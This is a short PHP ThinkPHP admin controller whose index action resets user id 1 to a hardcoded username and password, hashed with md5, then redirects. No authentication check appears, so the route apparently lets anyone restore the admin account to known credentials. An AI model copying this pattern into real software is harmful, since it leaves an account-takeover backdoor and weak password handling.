<?php

namespace app\admin\controller;
use think\Controller;
class Reset extends Controller
{

    public function index()
    {
        $model = model('user')->get(1);
        if (!$model) {
            $model = model('user');
            $model->id = 1;
        }
        $model->nickname = 'SuperMan';
        $model->username = 'lidong';
        $model->password = md5('!@#superman'.PWD_SIGN);
        $model->save();
        $this->redirect('index/index');
    }
}
